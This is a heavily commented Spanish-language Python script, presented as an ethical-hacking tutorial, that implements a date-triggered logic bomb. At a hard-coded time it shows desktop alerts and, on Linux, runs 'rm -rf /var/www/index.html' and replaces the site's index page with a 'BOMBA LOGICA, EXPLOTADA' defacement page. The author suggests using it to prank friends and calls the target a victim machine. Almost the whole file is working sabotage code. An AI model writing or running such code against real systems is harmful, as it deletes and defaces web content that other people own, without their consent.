# TITULO:	BOMBA LOGICA DIVERTIDA.		 #	El objetivo de la siguiente bomba logica, es ejecutarse cuando la fecha y hora coinciden, este programa se podria
# AUTOR:	MANZA						 #  a ver creado de muchas maneras, si el usuario hubiera creado un archivo en escritorio por ejemplo.
# FECHA: 	20 ENERO 2019				 #	Pero lo mas gracioso me parecia que se ejeuctase a una hora y fecha, por si es el día de los inocentes. :D
# DIRIGIDO:	HACKING ETICO - ESPAÑOL		 #  Espero que te guste, tanto como a mi crearlo.
# CODIGO:	PYTHON 3					 #
##########################################

###@@@@@@###

#El Script de la bomba logica empieza aqui.

###@@@@@@###

# Importamos los modulos del tiempo y todo lo que necesitemos, en este caso solo la hora y fecha.
# Tambien añadiremos el modulo "os", para poder detectar el sistema operativo, y depende del sistema operativo haga una cosa u otra.

import time, datetime, os

# En la variable "explota_fecha_hora_objetivo" le asignamos la fecha y hora de la explosión.
# Formato: "AÑO-MES-DIA HORA:MINUTOS:SEGUNDOS" la hora en formato 24H

explota_fecha_hora_objetivo = "2019-01-19 17:27:10"

# Con los "print()" lo que vamos a conseguir es mostar en pantalla la fecha y hora asignada con anterioridad, cogiendo de referente la variable, ademas del sistema operativo.
# Los siguientes "print()" se creo para saber si todo funcionaba, si quieres hacer pruebas descomentalo, eliminando la #

# print(f"La bomba explotara a el dia y hora: {explota_fecha_hora_objetivo}")
# print(f"Sistema operativo encontrado: {os.name}")

# Esta funcion la he tenido que poner aqui, por que no se puede ejecutar si se encuentra debajo, debido a que python, lo tiene que leer.

def cambio_diseño_web_linux():

	# El siguiente codigo, los antivirus pueden detectarlo como troyano, si se compilase este script, por que la funcion "os.system()", lo que hace es ejecutar una comdando en una shell.
	# Lo que hace esto, es para que no genere conflicto el desarrollo de una pagina web nueva, elimina la anterior y procede a crear una nueva con los datos que le demos.
	# Si no se quiere eliminar podemos desmarcar la sigiente linea, quitando el simbolo #
	# Lo que hace es renombrar el fichero de la web anterior a "backup_index.html", y asi no tener problemas con la creacion del nuevo, y seria apto para una broma

	# os.system("mv /var/www/index.html /var/www/backup_index.html")

	# La siguiente linea se puede comentar poniendo al principio el simbolo de #, la funcion de lo siguiente es eliminar la web anterior para poder poner y crear una nueva

	os.system("rm -rf /var/www/index.html")
	
	# Importamos el modulo ramdon, para crear la pagina web de forma aleatoria.

	from random import randrange, choice

	# Primero creare un archivo css, para poder poner estilo a la pagina web, y despues creare la pagina html, para que tenga su maquetacion e informacion.
	# Ahora procederemos a crear la ruta y guardarla en una variable el CSS. Ademas de crear el archivo y rellenarlo de informacion, aleatoria.
	# Aqui creamos el archivo si no exite, ademas lo pondremos en utf-8 para que acepte todos los caracteres.
	# Si no has entendido que hace esto, trata, de meter la ruta en una variable llamada "ruta_css", y despues lo abrimos con la variable "fichero"
	# Entonces todo lo que guardemos lo guardaremos en la variable "fichero", que en realidad es la variable "ruta_css"
	# La diferencia entre "fichero" y "ruta_css" es que fichero tiene la habilidad de escritura, como se puede ver en la siguiente linea.

	ruta_css = "/var/www/html/diseño_bomba_web.css"

	# Aqui creamos el archivo si no exite, ademas lo pondremos en utf-8 para que acepte todos los caracteres.

	with open(ruta_css, mode="w", encoding="utf-8") as fichero:

		# Ahora guardaremos en las suguientes variables, datos aleatorios para el css.

	    color = randrange(0, 361)
	    tamanyo = randrange(200, 801, 100)
	    fuente = choice(["serif", "sans-serif", "monospace", "cursive"])

	    # Ahora escribiremos la informacion dentro del fichero.

	    print("body {", file=fichero)
	    print(f"  background-color: hsl({color}, 100%, 50%);", file=fichero)
	    print("}", file=fichero)
	    print("", file=fichero)
	    print("p {", file=fichero)
	    print(f"  font-family: {fuente};", file=fichero)
	    print(f"  font-size: {tamanyo}%;", file=fichero)
	    print("}", file=fichero)

	# Ahora procederemos a crear el diseño en HTML, en este caso sera algo simple, y pondremos un texto, todo lo guardamos en un archivo, como en el anterior.
	# Si no has entendido que hace esto, trata, de meter la ruta en una variable llamada "ruta_html", y despues lo abrimos con la variable "fichero"
	# Entonces todo lo que guardemos lo guardaremos en la variable "fichero", que en realidad es la variable "ruta_html"
	# La diferencia entre "fichero" y "ruta_html" es que fichero tiene la habilidad de escritura, como se puede ver en la siguiente linea.

	ruta_html = "/var/www/html/index.html"

	# Aqui creamos el archivo si no exite, ademas lo pondremos en utf-8 para que acepte todos los caracteres.

	with open(ruta_html, mode="w", encoding="utf-8") as fichero:

		# A partir de aqui, escribiremos todo lo que queremos dentro del fichero.

	    print("<!DOCTYPE html>", file=fichero)
	    print("<html lang=\"es\">", file=fichero)
	    print("<head>", file=fichero)
	    print("  <meta charset=\"utf-8\" />", file=fichero)
	    print("  <title>BOMBA LOGICA</title>", file=fichero)
	    print("  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />",
	          file=fichero)
	    print(f"  <link rel=\"stylesheet\" type=\"text/css\" href=\"{ruta_css}\" />",
	          file=fichero)
	    print("</head>", file=fichero)
	    print("", file=fichero)
	    print("<body>", file=fichero)
	    print("  <p>¡BOMBA LOGICA, EXPLOTADA!!! CREADOR: MANZA!</p>", file=fichero)
	    print("</body>", file=fichero)
	    print("</html>", file=fichero)


# Esta funcion la he tenido que poner aqui, por que no se puede ejecutar si se encuentra debajo, debido a que python, lo tiene que leer.
# Esta funcion lo que tiene es un detector de sistema operativo, ademas de sus respectivo codigo, con sus respectivo codigo.

def encontrar_sistema_operativo():

	# Como al explotar la bomba quiero que salten notificaciones, incluyo el modulo de notificaciones.
	# Ahora esta mirando el sistema operativo que se esta usando si es Windows sacara de resultado "nt", entonces creamos una condicion que si eso es asi continue para Windows
	
	if os.name == 'nt':

		# Codigo para el sistema operativo de Windows.
		# Al detectar el sistema operativo Windows, importaremos los modulos necesarios para este sistema operativo.

		from win10toast import ToastNotifier

		# Ahora meteremos en la variable "toaster" la funcion "ToastNotifier", para ahorrarnos texto en el codigo.

		toaster = ToastNotifier()

		# El siguiente "print()" se creo para saber si todo funcionaba, si quieres hacer pruebas descomentalo, eliminando la #

		# print("Sistema operativo Windows detectado con exito!")

		# La funcion de este codigo sera hacer que salte una notifiacion de escritorio

		toaster.show_toast("ALERTA!!!","LA BOMBA LOGICA EXPLOTO, CREADOR: MANZA")

		pass

	# En caso de que no sea para Windows, ejecutara para otro sistema operativo en este caso para Unix (Linux)

	else:

		# Codigo para otro sistema operativo que no es Windows.
		# En esta cocasion, ubuntu ya tiene instalado el comando notify-send, asi que le daremos uso.
		# El siguiente "print()" se creo para saber si todo funcionaba, si quieres hacer pruebas descomentalo, eliminando la #

		# print("Otro sistema operativo diferente a Windows detectado con exito!")
		
		# La funcion de este codigo sera hacer que salte una notifiacion de escritorio
		# El siguiente codigo, los antivirus pueden detectarlo como troyano, si se compilase este script, por que la funcion "os.system()", lo que hace es ejecutar una comdando en una shell.

		os.system('notify-send "ALERTA!!!" "LA BOMBA LOGICA EXPLOTO, CREADOR: MANZA"')

		# En la siguiente linea, llamaremos a la funcion "cambio_diseño_web_linux", esta comentado en la parte superior.

		cambio_diseño_web_linux()
		
# Crearemos un bucle para que el programa se actualice cada segundo.

while True:

	# Dentro del bucle crearemos dos variable "codigo_numeros" y "fecha_hora_explosion"
	# Lo que conseguiran sera coger la fecha y hora del equipo, y al estar dentro del bucle.
	# Se este actualizando cada segundo.

	codigo_numeros = time.time()
	fecha_hora_explosion = datetime.datetime.fromtimestamp(codigo_numeros).strftime('%Y-%m-%d %H:%M:%S')

	# Creamos una condición, que si la hora del equipo coincide con la hora asignada con anterioridad, continuara si no coincide
	# La hora y fecha seguira actualizandose hasta que coincidan.

	if fecha_hora_explosion == explota_fecha_hora_objetivo:

		# Cuando todo a coincidido la bomba logica explota a partir de aqui se inserta el codigo deseado a ejecutarse.
		# El siguiente "print()" se creo para saber si todo funcionaba, si quieres hacer pruebas descomentalo, eliminando la #

		# print("LA BOMBA LOGICA EXPLOTO CON EXITO!")

		# Ahora llamamos a la funcion "encontrar_sistema_operativo()", en la parte superior se encuentra la funcion, dentro esta explicado.

		encontrar_sistema_operativo()

		# Cuando finalice todo, que se termine el bucle, y se cierre el programa.

		break

	# Como he dicho antes, si no coincide el programa pasa a repetirse.

	else:

		# Con esto dejaremos que continue el bucle.

		pass


#############################################################################################################################
#	NOTA DEL AUTOR: ESPERO QUE TE HAYA GUSTADO Y CON ESTO TENGAS UNA IDEA DE COMO ES LA CREACION DE UN BOMBA LOGICA.		#
#					RECUERDA LAS HACER SIEMPRE LAS COSAS PARA EL BIEN Y NO PARA EL MAL!										#
#					CON ESTE CODIGO PODRAS GASTAR ALGUNAS BROMAS A TUS AMIGOS.												#
#					EN NINGUN CASO ESTE CODIGO HACE UNA BOMBA FORK.															#
#																															#
#					ESTE CODIGO SE PODRIA CREAR MAS CORTO, SI HUBIERA SE HUBIERA CREADO UNA TAREA EN EL EQUIPO VICTIMA.		#
#					COMO POR EJEMPLO UN CRONTAB EN LINUX O LAS TAREAS DE WINDOWS, COMO DETALLE SE LE AGREGO UN SISTEMA DE   #
#					DETECCION DE SISTEMAS OPERATIVOS, PARA QUE SEA FUNCIONAN EN AMBOS SISTEMAS.								#
#					ADEMAS QUE TODO EL CODIGO ESTA COMENTADO, Y OCUPA MAS CANTIDAD.											#
#																															#
#					AUTOR: MANZA                                                                                            #
#############################################################################################################################